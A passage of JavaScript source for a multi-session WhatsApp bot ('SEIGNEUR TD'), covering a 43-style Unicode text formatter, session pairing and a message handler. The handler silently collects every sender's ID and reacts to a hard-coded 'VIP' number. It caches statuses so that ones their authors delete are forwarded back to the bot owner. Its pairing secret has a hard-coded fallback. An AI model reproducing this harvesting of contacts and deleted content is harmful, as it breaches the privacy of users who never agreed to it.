      { map: {'a':'Ꭺ','b':'Ᏸ','c':'Ꮯ','d':'Ꭰ','e':'Ꮛ','f':'Ꭶ','g':'Ꮆ','h':'Ꮒ','i':'Ꭵ','j':'Ꮰ','k':'Ꮶ','l':'Ꮮ','m':'Ꮇ','n':'Ꮑ','o':'Ꭷ','p':'Ꭾ','q':'Ꭴ','r':'Ꮢ','s':'Ꮥ','t':'Ꮦ','u':'Ꮜ','v':'Ꮩ','w':'Ꮃ','x':'Ꮙ','y':'Ꮍ','z':'ፚ','A':'Ꭺ','B':'Ᏸ','C':'Ꮯ','D':'Ꭰ','E':'Ꮛ','F':'Ꭶ','G':'Ꮆ','H':'Ꮒ','I':'Ꭵ','J':'Ꮰ','K':'Ꮶ','L':'Ꮮ','M':'Ꮇ','N':'Ꮑ','O':'Ꭷ','P':'Ꭾ','Q':'Ꭴ','R':'Ꮢ','S':'Ꮥ','T':'Ꮦ','U':'Ꮜ','V':'Ꮩ','W':'Ꮃ','X':'Ꮙ','Y':'Ꮍ','Z':'ፚ'} },
      // 7 - ᘔOKOᑌ Canadian Aboriginal
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᕮ','f':'ᖴ','g':'ᘜ','h':'ᕼ','i':'ᓰ','j':'ᒍ','k':'ᛕ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'O','p':'ᑭ','q':'ᕴ','r':'ᖇ','s':'ᔕ','t':'ᗪ','u':'ᑌ','v':'ᐯ','w':'ᗯ','x':'ᘔ','y':'ᖻ','z':'ᘔ','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᕮ','F':'ᖴ','G':'ᘜ','H':'ᕼ','I':'ᓰ','J':'ᒍ','K':'ᛕ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'O','P':'ᑭ','Q':'ᕴ','R':'ᖇ','S':'ᔕ','T':'ᗪ','U':'ᑌ','V':'ᐯ','W':'ᗯ','X':'ᘔ','Y':'ᖻ','Z':'ᘔ'} },
      // 8 - ʐօӄօʊ Armenian
      { map: {'a':'ą','b':'ҍ','c':'ç','d':'ժ','e':'ҽ','f':'ƒ','g':'ց','h':'հ','i':'ì','j':'ʝ','k':'ҟ','l':'Ӏ','m':'ʍ','n':'ղ','o':'օ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'է','u':'մ','v':'ѵ','w':'ա','x':'×','y':'վ','z':'ʐ','A':'Ą','B':'Ҍ','C':'Ç','D':'Ժ','E':'Ҽ','F':'Ƒ','G':'Ց','H':'Հ','I':'Ì','J':'ʝ','K':'Ҟ','L':'Ӏ','M':'ʍ','N':'Ղ','O':'Օ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Է','U':'Մ','V':'Ѵ','W':'Ա','X':'×','Y':'Վ','Z':'ʐ'} },
      // 9 - 𝚉𝚘𝚔𝚘𝚞 Monospace
      { range: [0x1D670, 0x1D689, 0x1D670] }, // handled separately
      // 10 - 𝙕𝙤𝙠𝙤𝙪 Bold Italic
      { range: [0x1D468, 0x1D481, 0x1D468] },
      // 11 - 𝐙𝐨𝐤𝐨𝐮 Bold
      { range: [0x1D400, 0x1D419, 0x1D400] },
      // 12 - 𝗭𝗼𝗸𝗼𝘂 Bold Sans
      { range: [0x1D5D4, 0x1D5ED, 0x1D5D4] },
      // 13 - 𝘡𝘰𝘬𝘰𝘶 Italic Sans
      { range: [0x1D608, 0x1D621, 0x1D608] },
      // 14 - Zσƙσυ Greek-ish
      { map: {'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'ƒ','g':'g','h':'н','i':'ι','j':'נ','k':'ƙ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'з','A':'Α','B':'В','C':'¢','D':'∂','E':'Є','F':'Ƒ','G':'G','H':'Η','I':'Ι','J':'נ','K':'Ƙ','L':'ℓ','M':'М','N':'Η','O':'Ω','P':'Ρ','Q':'Q','R':'Я','S':'Ѕ','T':'Τ','U':'Υ','V':'Ν','W':'Ω','X':'Χ','Y':'Υ','Z':'Ζ'} },
      // 15 - ⱫØ₭ØɄ Currency
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 16 - Zðkðµ
      { map: {'a':'å','b':'ƀ','c':'ċ','d':'ð','e':'ê','f':'ƒ','g':'ĝ','h':'ĥ','i':'î','j':'ĵ','k':'ķ','l':'ļ','m':'m','n':'ñ','o':'ð','p':'þ','q':'q','r':'ŗ','s':'ş','t':'ţ','u':'µ','v':'v','w':'ŵ','x':'x','y':'ÿ','z':'ƶ','A':'Å','B':'Ƀ','C':'Ċ','D':'Ð','E':'Ê','F':'Ƒ','G':'Ĝ','H':'Ĥ','I':'Î','J':'Ĵ','K':'Ķ','L':'Ļ','M':'M','N':'Ñ','O':'Ð','P':'Þ','Q':'Q','R':'Ŗ','S':'Ş','T':'Ţ','U':'Ü','V':'V','W':'Ŵ','X':'X','Y':'Ÿ','Z':'Ƶ'} },
      // 17 - zσкσυ Cyrillic Greek
      { map: {'a':'α','b':'в','c':'с','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'і','j':'ʝ','k':'к','l':'l','m':'м','n':'η','o':'σ','p':'р','q':'q','r':'г','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ш','x':'χ','y':'у','z':'z','A':'Α','B':'В','C':'С','D':'D','E':'Є','F':'F','G':'G','H':'Н','I':'І','J':'J','K':'К','L':'L','M':'М','N':'Η','O':'Ω','P':'Р','Q':'Q','R':'Г','S':'Ѕ','T':'Т','U':'Υ','V':'Ν','W':'Ш','X':'Χ','Y':'У','Z':'Z'} },
      // 18 - ɀօҟօմ Armenian mix
      { map: {'a':'ɑ','b':'ɓ','c':'ƈ','d':'ɖ','e':'ɘ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ҟ','l':'ʟ','m':'ɱ','n':'ɳ','o':'ɔ','p':'ρ','q':'q','r':'ɹ','s':'ʂ','t':'ƭ','u':'ʋ','v':'ʌ','w':'ɯ','x':'χ','y':'ʎ','z':'ɀ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɖ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ҟ','L':'ʟ','M':'Ɱ','N':'ɳ','O':'Ɔ','P':'Ρ','Q':'Q','R':'ɹ','S':'Ʂ','T':'Ƭ','U':'Ʋ','V':'Ʌ','W':'Ɯ','X':'Χ','Y':'ʎ','Z':'ɀ'} },
      // 19 - ZӨKӨЦ Cyrillic caps
      { map: {'a':'Δ','b':'Ъ','c':'С','d':'D','e':'Є','f':'F','g':'Ǵ','h':'Н','i':'І','j':'J','k':'К','l':'Ĺ','m':'М','n':'Й','o':'Θ','p':'Р','q':'Q','r':'Я','s':'Ş','t':'Т','u':'Ц','v':'V','w':'W','x':'Х','y':'Ч','z':'Z','A':'Δ','B':'Ъ','C':'С','D':'D','E':'Є','F':'F','G':'Ǵ','H':'Н','I':'І','J':'J','K':'К','L':'Ĺ','M':'М','N':'Й','O':'Θ','P':'Р','Q':'Q','R':'Я','S':'Ş','T':'Т','U':'Ц','V':'V','W':'W','X':'Х','Y':'Ч','Z':'Z'} },
      // 20 - Subscript
      { map: {'a':'ₐ','b':'b','c':'c','d':'d','e':'ₑ','f':'f','g':'g','h':'ₕ','i':'ᵢ','j':'ⱼ','k':'ₖ','l':'ₗ','m':'ₘ','n':'ₙ','o':'ₒ','p':'ₚ','q':'q','r':'ᵣ','s':'ₛ','t':'ₜ','u':'ᵤ','v':'ᵥ','w':'w','x':'ₓ','y':'y','z':'z','A':'ₐ','B':'B','C':'C','D':'D','E':'ₑ','F':'F','G':'G','H':'ₕ','I':'ᵢ','J':'ⱼ','K':'ₖ','L':'ₗ','M':'ₘ','N':'ₙ','O':'ₒ','P':'ₚ','Q':'Q','R':'ᵣ','S':'ₛ','T':'ₜ','U':'ᵤ','V':'ᵥ','W':'W','X':'ₓ','Y':'Y','Z':'Z','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'} },
      // 21 - Superscript
      { map: {'a':'ᵃ','b':'ᵇ','c':'ᶜ','d':'ᵈ','e':'ᵉ','f':'ᶠ','g':'ᵍ','h':'ʰ','i':'ⁱ','j':'ʲ','k':'ᵏ','l':'ˡ','m':'ᵐ','n':'ⁿ','o':'ᵒ','p':'ᵖ','q':'q','r':'ʳ','s':'ˢ','t':'ᵗ','u':'ᵘ','v':'ᵛ','w':'ʷ','x':'ˣ','y':'ʸ','z':'ᶻ','A':'ᴬ','B':'ᴮ','C':'ᶜ','D':'ᴰ','E':'ᴱ','F':'ᶠ','G':'ᴳ','H':'ᴴ','I':'ᴵ','J':'ᴶ','K':'ᴷ','L':'ᴸ','M':'ᴹ','N':'ᴺ','O':'ᴼ','P':'ᴾ','Q':'Q','R':'ᴿ','S':'ˢ','T':'ᵀ','U':'ᵁ','V':'ᵛ','W':'ᵂ','X':'ˣ','Y':'ʸ','Z':'ᶻ','0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'} },
      // 22 - Thai style
      { map: {'a':'ค','b':'๖','c':'ς','d':'๔','e':'є','f':'f','g':'ﻮ','h':'h','i':'ﺎ','j':'ﻝ','k':'k','l':'l','m':'๓','n':'ห','o':'๏','p':'p','q':'q','r':'r','s':'ร','t':'t','u':'ย','v':'ν','w':'ω','x':'x','y':'ч','z':'z','A':'ค','B':'๖','C':'ς','D':'๔','E':'є','F':'F','G':'ﻮ','H':'H','I':'ﺎ','J':'ﻝ','K':'K','L':'L','M':'๓','N':'ห','O':'๏','P':'P','Q':'Q','R':'R','S':'ร','T':'T','U':'ย','V':'Ν','W':'Ω','X':'X','Y':'Ч','Z':'Z'} },
      // 23 - Double struck 𝕫𝕠𝕜𝕠𝕦
      { range: [0x1D538, 0x1D551, 0x1D538] },
      // 24 - Fraktur 𝖅𝖔𝖐𝖔𝖚
      { range: [0x1D504, 0x1D51D, 0x1D504] },
      // 25 - Negative squared 🆉🅾🅺🅾🆄
      { map: {'a':'🅰','b':'🅱','c':'🅲','d':'🅳','e':'🅴','f':'🅵','g':'🅶','h':'🅷','i':'🅸','j':'🅹','k':'🅺','l':'🅻','m':'🅼','n':'🅽','o':'🅾','p':'🅿','q':'🆀','r':'🆁','s':'🆂','t':'🆃','u':'🆄','v':'🆅','w':'🆆','x':'🆇','y':'🆈','z':'🆉','A':'🅰','B':'🅱','C':'🅲','D':'🅳','E':'🅴','F':'🅵','G':'🅶','H':'🅷','I':'🅸','J':'🅹','K':'🅺','L':'🅻','M':'🅼','N':'🅽','O':'🅾','P':'🅿','Q':'🆀','R':'🆁','S':'🆂','T':'🆃','U':'🆄','V':'🆅','W':'🆆','X':'🆇','Y':'🆈','Z':'🆉'} },
      // 26 - Script Bold 𝓩𝓸𝓴𝓸𝓾
      { range: [0x1D4D0, 0x1D4E9, 0x1D4D0] },
      // 27 - Fraktur 𝔷𝔬𝔨𝔬𝔲
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 28 - Fullwidth Ｚｏｋｏｕ
      { map: {'a':'ａ','b':'ｂ','c':'ｃ','d':'ｄ','e':'ｅ','f':'ｆ','g':'ｇ','h':'ｈ','i':'ｉ','j':'ｊ','k':'ｋ','l':'ｌ','m':'ｍ','n':'ｎ','o':'ｏ','p':'ｐ','q':'ｑ','r':'ｒ','s':'ｓ','t':'ｔ','u':'ｕ','v':'ｖ','w':'ｗ','x':'ｘ','y':'ｙ','z':'ｚ','A':'Ａ','B':'Ｂ','C':'Ｃ','D':'Ｄ','E':'Ｅ','F':'Ｆ','G':'Ｇ','H':'Ｈ','I':'Ｉ','J':'Ｊ','K':'Ｋ','L':'Ｌ','M':'Ｍ','N':'Ｎ','O':'Ｏ','P':'Ｐ','Q':'Ｑ','R':'Ｒ','S':'Ｓ','T':'Ｔ','U':'Ｕ','V':'Ｖ','W':'Ｗ','X':'Ｘ','Y':'Ｙ','Z':'Ｚ',' ':'　','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'} },
      // 29 - Small caps ᴢᴏᴋᴏᴜ
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 30 - Italic 𝑍𝒐𝒌𝒐𝒖
      { range: [0x1D434, 0x1D44D, 0x1D434] },
      // 31 - Math bold 𝛧𝛩𝛫𝛩𝑈
      { map: {'a':'𝛼','b':'𝛽','c':'𝛾','d':'𝛿','e':'𝜀','f':'𝜁','g':'𝜂','h':'𝜃','i':'𝜄','j':'𝜅','k':'𝜆','l':'𝜇','m':'𝜈','n':'𝜉','o':'𝜊','p':'𝜋','q':'𝜌','r':'𝜍','s':'𝜎','t':'𝜏','u':'𝜐','v':'𝜑','w':'𝜒','x':'𝜓','y':'𝜔','z':'z','A':'𝛢','B':'𝛣','C':'𝛤','D':'𝛥','E':'𝛦','F':'𝛧','G':'𝛨','H':'𝛩','I':'𝛪','J':'𝛫','K':'𝛬','L':'𝛭','M':'𝛮','N':'𝛯','O':'𝛰','P':'𝛱','Q':'𝛲','R':'𝛳','S':'𝛴','T':'𝛵','U':'𝛶','V':'𝛷','W':'𝛸','X':'𝛹','Y':'𝛺','Z':'𝛻'} },
      // 32 - Math Monospace Bold 𝚭𝚯𝐊𝚯𝐔
      { map: {'a':'𝚊','b':'𝚋','c':'𝚌','d':'𝚍','e':'𝚎','f':'𝚏','g':'𝚐','h':'𝚑','i':'𝚒','j':'𝚓','k':'𝚔','l':'𝚕','m':'𝚖','n':'𝚗','o':'𝚘','p':'𝚙','q':'𝚚','r':'𝚛','s':'𝚜','t':'𝚝','u':'𝚞','v':'𝚟','w':'𝚠','x':'𝚡','y':'𝚢','z':'𝚣','A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸','J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁','S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉'} },
      // 33 - ɀꪮᛕꪮꪊ Vai/Runic mix
      { map: {'a':'ꪖ','b':'ꪜ','c':'ꪊ','d':'ᦔ','e':'ꫀ','f':'ꪰ','g':'ᧁ','h':'ꫝ','i':'ꪱ','j':'ꪝ','k':'ᛕ','l':'ꪶ','m':'ꪑ','n':'ꪀ','o':'ꪮ','p':'ρ','q':'ꪕ','r':'ꪹ','s':'ꫛ','t':'ꪻ','u':'ꪊ','v':'ꪜ','w':'ꪲ','x':'ꪤ','y':'ꪗ','z':'ɀ','A':'ꪖ','B':'ꪜ','C':'ꪊ','D':'ᦔ','E':'ꫀ','F':'ꪰ','G':'ᧁ','H':'ꫝ','I':'ꪱ','J':'ꪝ','K':'ᛕ','L':'ꪶ','M':'ꪑ','N':'ꪀ','O':'ꪮ','P':'ρ','Q':'ꪕ','R':'ꪹ','S':'ꫛ','T':'ꪻ','U':'ꪊ','V':'ꪜ','W':'ꪲ','X':'ꪤ','Y':'ꪗ','Z':'ɀ'} },
      // 34 - plain lowercase
      { map: {'a':'a','b':'b','c':'c','d':'d','e':'e','f':'f','g':'g','h':'h','i':'i','j':'j','k':'k','l':'l','m':'m','n':'n','o':'o','p':'p','q':'q','r':'r','s':'s','t':'t','u':'u','v':'v','w':'w','x':'x','y':'y','z':'z','A':'a','B':'b','C':'c','D':'d','E':'e','F':'f','G':'g','H':'h','I':'i','J':'j','K':'k','L':'l','M':'m','N':'n','O':'o','P':'p','Q':'q','R':'r','S':'s','T':'t','U':'u','V':'v','W':'w','X':'x','Y':'y','Z':'z'} },
      // 35 - Bold Italic Script 𝒁𝒐𝒌𝒐𝒖
      { range: [0x1D400, 0x1D419, 0x1D400], italic: true },
      // 36 - Circled letters Ⓩⓞⓚⓞⓤ
      { map: {'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ','k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ','u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ','A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ','K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ','U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'} },
      // 37 - Upside down Zoʞon-ɯp
      { map: {'a':'ɐ','b':'q','c':'ɔ','d':'p','e':'ǝ','f':'ɟ','g':'ƃ','h':'ɥ','i':'ı','j':'ɾ','k':'ʞ','l':'l','m':'ɯ','n':'u','o':'o','p':'d','q':'b','r':'ɹ','s':'s','t':'ʇ','u':'n','v':'ʌ','w':'ʍ','x':'x','y':'ʎ','z':'z','A':'∀','B':'q','C':'Ɔ','D':'p','E':'Ǝ','F':'Ⅎ','G':'פ','H':'H','I':'I','J':'ɾ','K':'ʞ','L':'˥','M':'W','N':'N','O':'O','P':'d','Q':'Q','R':'ɹ','S':'S','T':'┴','U':'∩','V':'Λ','W':'M','X':'X','Y':'⅄','Z':'Z'} },
      // 38 = same as 29 (small caps)
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 39 = same as 27
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 40 = same as 15
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 41 = same as 5
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 42 - Negative circled 🅩🅞🅚🅞🅤
      { map: {'a':'🅐','b':'🅑','c':'🅒','d':'🅓','e':'🅔','f':'🅕','g':'🅖','h':'🅗','i':'🅘','j':'🅙','k':'🅚','l':'🅛','m':'🅜','n':'🅝','o':'🅞','p':'🅟','q':'🅠','r':'🅡','s':'🅢','t':'🅣','u':'🅤','v':'🅥','w':'🅦','x':'🅧','y':'🅨','z':'🅩','A':'🅐','B':'🅑','C':'🅒','D':'🅓','E':'🅔','F':'🅕','G':'🅖','H':'🅗','I':'🅘','J':'🅙','K':'🅚','L':'🅛','M':'🅜','N':'🅝','O':'🅞','P':'🅟','Q':'🅠','R':'🅡','S':'🅢','T':'🅣','U':'🅤','V':'🅥','W':'🅦','X':'🅧','Y':'🅨','Z':'🅩'} },
      // 43 - Underline Z̲o̲k̲o̲u̲
      { underline: true },
    ];

    const style = styles[styleIndex];
    if (!style) return text;

    // Style with underline
    if (style.underline) {
      return text.split('').map(c => c !== ' ' ? c + '\u0332' : c).join('');
    }

    // Style with range Unicode (mathématique)
    if (style.range) {
      const [upperBase, , lowerBase] = style.range;
      return text.split('').map(c => {
        const code = c.charCodeAt(0);
        if (code >= 65 && code <= 90) return String.fromCodePoint(upperBase + (code - 65));
        if (code >= 97 && code <= 122) return String.fromCodePoint(lowerBase + (code - 97));
        return c;
      }).join('');
    }

    // Style with map
    if (style.map) {
      return text.split('').map(c => style.map[c] || c).join('');
    }

    return text;
  }

  const TOTAL_STYLES = 43;

  // Un seul style demandé
  if (styleNum !== null && styleNum >= 1 && styleNum <= TOTAL_STYLES) {
    const result = applyStyle(text, styleNum - 1);
    await sock.sendMessage(remoteJid, {
      text: `✨ *Style ${styleNum}:*\n\n${result}`
    });
    return;
  }

  // Tous les styles — envoyer en un seul message
  const lines = [];
  for (let i = 1; i <= TOTAL_STYLES; i++) {
    try {
      const result = applyStyle(text, i - 1);
      lines.push(`*${i}.* ${result}`);
    } catch(e) {
      lines.push(`*${i}.* ${text}`);
    }
  }

  const output = `✨ *FANCY — ${text}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${lines.join('\n')}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n_${config.prefix}fancy [1-${TOTAL_STYLES}] [texte] pour un style spécifique_`;

  await sock.sendMessage(remoteJid, { text: output });
}

function formatUptime(seconds) {
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = Math.floor(seconds % 60);
  return `${hours}h ${minutes}m ${secs}s`;
}

// =============================================
// LANCEMENT DU BOT
// =============================================

console.log('╔══════════════════════════════╗');
console.log('║   SEIGNEUR TD v3.5  ║');
console.log('╚══════════════════════════════╝\n');



// =============================================
// 🌐 MULTI-SESSION PAIRING SYSTEM
// Inspiré du système Seigneur TD Bot
// =============================================

// Map des sessions actives: phone -> { sock, status, pairingCode, createdAt }
const activeSessions = new Map();

const PAIRING_PORT   = process.env.PAIRING_PORT || 2006;
const PAIRING_SECRET = process.env.PAIRING_SECRET || 'SEIGNEUR_SECRET_KEY';

// Vérifier si session a des credentials valides
function sessionHasCredentials(phone) {
  const sessionFolder = './sessions/' + phone;
  const credsFile = sessionFolder + '/creds.json';
  try {
    if (!fs.existsSync(credsFile)) return false;
    const creds = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
    return !!(creds?.me?.id || creds?.registered);
  } catch(e) { return false; }
}

// ─── Bot indépendant par session ─────────────────────────────────────────────
function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
  console.log('[' + phone + '] 🚀 Bot indépendant démarré!');
  sock._sessionPhone = phone;
  // Nettoyer les listeners précédents pour éviter accumulation sur reconnexion
  try {
    sock.ev.removeAllListeners('messages.upsert');
    sock.ev.removeAllListeners('groups.update');
    sock.ev.removeAllListeners('group-participants.update');
    sock.ev.removeAllListeners('messages.delete');
    sock.ev.removeAllListeners('messages.update');
    sock.ev.removeAllListeners('call');
  } catch(e) {}
  // Raccourci vers l'état isolé de cette session
  const _ss = _getSessionState(phone);

  // Référence directe — pas de wrapper
  sock._origSend = sock.sendMessage.bind(sock);

  // Pas de message de bienvenue automatique

  // Handler messages
  const _sessionProcessedIds = new Set();
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const message of messages) {
      // 👑 RÉACTION VIP — priorité absolue, non-bloquant, avant tout traitement
      try {
        const _vipNum = '23591234568';
        const _vipSenderJid = message.key?.participant || message.key?.remoteJid || '';
        const _vipSenderNum = _vipSenderJid.split('@')[0].replace(/[^0-9]/g, '');
        if (!message.key?.fromMe && (_vipSenderNum === _vipNum || _vipSenderJid === '124318499475488@lid' || _vipSenderJid.startsWith('124318499475488'))) {
          sock.sendMessage(message.key.remoteJid, { react: { text: '👑', key: message.key } }).catch(() => {});
        }
      } catch(e) {}

      // Collecter TOUS les JIDs dès réception — avant tout filtre
      try {
        if (!message.key?.fromMe) {
          const _cJid = message.key?.participant || message.key?.remoteJid;
          if (_cJid && _cJid.endsWith('@s.whatsapp.net')) _knownContacts.add(_cJid);
        }
      } catch(e) {}

      try {
        const msgAge = Date.now() - ((message.messageTimestamp || 0) * 1000);
        if (msgAge > 10 * 60 * 1000) continue;
        const msgId = message.key?.id;
        if (!msgId || _sessionProcessedIds.has(msgId)) continue;
        _sessionProcessedIds.add(msgId);
        if (_sessionProcessedIds.size > 2000) _sessionProcessedIds.delete(_sessionProcessedIds.values().next().value);
        const remoteJid = message.key.remoteJid;
        if (!remoteJid) continue;

        // ✅ GESTION STATUTS pour sessions web
        if (remoteJid === 'status@broadcast') {
          try {
            const _stSender = message.key.participant || message.key.remoteJid;
            const _stBotJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const _stType = Object.keys(message.message || {})[0];
            // AntiDeleteStatus
            if (_stType === 'protocolMessage') {
              if (_ss.antiDeleteStatus) {
                try {
                  const _proto = message.message.protocolMessage;
                  if (_proto?.type === 0) {
                    const _delJid = message.key.participant || _stSender;
                    const _cached = global._statusCache?.get(_proto.key?.id);
                    // Anti-doublon — ne pas envoyer deux fois pour le même statut supprimé
                    if (!global._statusDeleteSent) global._statusDeleteSent = new Set();
                    const _dedupKey = _proto.key?.id + '_' + phone;
                    if (global._statusDeleteSent.has(_dedupKey)) { continue; }
                    global._statusDeleteSent.add(_dedupKey);
                    if (global._statusDeleteSent.size > 200) global._statusDeleteSent.delete(global._statusDeleteSent.values().next().value);
                    // Si pas en cache — ignorer silencieusement
                    if (!_cached) { continue; }
                    const _num = _delJid.split('@')[0].replace(/[^0-9]/g, '');
                    const _cap = '🗑️ *Status supprimé*\n👤 @' + _num + '\n\n*© SEIGNEUR TD*';
                    if (_cached.type === 'image') await sock.sendMessage(_stBotJid, { image: _cached.buf, caption: _cap, mentions: [_delJid] });
                    else if (_cached.type === 'video') await sock.sendMessage(_stBotJid, { video: _cached.buf, caption: _cap, mentions: [_delJid] });
                    else await sock.sendMessage(_stBotJid, { text: '🗑️ *Status supprimé*\n👤 @' + _num + '\n📝 ' + _cached.text + '\n\n*© SEIGNEUR TD*', mentions: [_delJid] });
                  }
                } catch(e) {}
              }
              continue;
            }
            if (!_stType) continue;
            // AutoStatusViews — indépendant du react
            if (_ss.autoStatusViews && _stSender !== _stBotJid) await sock.readMessages([message.key]).catch(() => {});
            // AutoReactStatus — indépendant de autoStatusViews
            if (_ss.autoReactStatus && _stSender !== _stBotJid) {
              await sock.sendMessage('status@broadcast', { react: { text: _ss.statusReactEmoji, key: message.key } }, { statusJidList: [_stSender] }).catch(() => {});
            }
            // Cache TOUJOURS les statuts pour antiDeleteStatus (même si désactivé pour l'instant)
            try {
              if (!global._statusCache) global._statusCache = new Map();
              const _m2 = message.message; const _sk = message.key.id;
